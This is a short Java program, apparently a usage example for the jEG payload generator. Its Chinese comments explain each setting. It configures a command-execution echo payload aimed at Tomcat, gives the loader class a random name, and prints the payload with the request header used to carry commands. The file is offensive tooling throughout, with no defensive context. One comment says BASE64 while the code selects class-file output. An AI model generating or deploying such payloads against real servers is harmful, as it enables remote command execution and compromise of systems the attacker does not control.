import jeg.common.util.ClassUtil;
import jeg.core.config.jEGConstants;
import jeg.core.jEGenerator;
import jeg.core.config.jEGConfig;

public class GeneratorTest {
    public static void main(String[] args) throws Throwable {
        // 基本配置
        jEGConfig config = new jEGConfig() {{
            // 设置待回显的中间件为 tomcat
            setServerType(jEGConstants.SERVER_TOMCAT);
            // 设置待执行的 payload 为命令执行回显
            setModelType(jEGConstants.MODEL_CMD);
            // 设置 payload 的输出格式为 BASE64
            setFormatType(jEGConstants.FORMAT_CLASS);
            // 初始化基础配置
            build();
        }};
        config.setLoaderClassName(ClassUtil.getRandomLoaderClassName());
        // 生成 payload
        jEGenerator generator = new jEGenerator(config);
        System.out.println("请求头: " + config.getReqHeaderName());
        String payload = generator.getPayload();
        System.out.println(payload.length());
        System.out.println(payload);

    }
}